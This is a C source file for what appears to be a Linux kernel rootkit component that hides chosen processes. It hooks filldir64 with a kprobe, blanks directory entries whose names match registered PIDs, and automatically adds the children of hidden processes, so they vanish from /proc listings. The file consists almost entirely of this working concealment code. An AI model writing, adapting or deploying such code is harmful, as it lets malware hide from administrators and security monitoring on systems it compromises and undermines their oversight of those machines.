#include "hideproc.h"

struct kprobe kpp = { .symbol_name = "filldir64",
		      .pre_handler = _handler_proc_filldir64 };

unsigned int pids[PIDS_MAX];
unsigned int pids_count;

// Add a pid to hide
void hideproc_add_pid(short pid)
{
	pids[pids_count++] = pid;
	return;
}

int _check_pid_already_registred(short pid)
{
	for (int count = 0; count < pids_count; count++) {
		if (pid == pids[count]) {
			return 1;
		}
	}
	return 0;
}

// auto hide child pid from process in pids array
void _update_child_pid(void)
{
	struct task_struct *task;

	for_each_process(task) {
		if (_check_pid_already_registred(task->parent->pid) &&
		    !_check_pid_already_registred(task->pid) &&
		    pids_count < PIDS_MAX) {
			pids[pids_count++] = task->pid;
		}
	}
}

int _handler_proc_filldir64(struct kprobe *p, struct pt_regs *regs)
{
	char *filename = (char *)regs->si;
	char pid_str[16];

	_update_child_pid();

	for (int count = 0; count < pids_count; count++) {
		sprintf(pid_str, "%u", pids[count]);
		if (strcmp(filename, pid_str) == 0) {
			strcpy((char *)regs->si, "\x00");
		}
	}

	return 0;
}

int hideproc_init(void)
{
	int ret;
	ret = register_kprobe(&kpp);
	if (ret < 0) {
		return ret;
	}

	return 0;
}

void hideproc_exit(void)
{
	unregister_kprobe(&kpp);
}

EXPORT_SYMBOL(hideproc_init);
EXPORT_SYMBOL(hideproc_exit);
EXPORT_SYMBOL(pids);
EXPORT_SYMBOL(pids_count);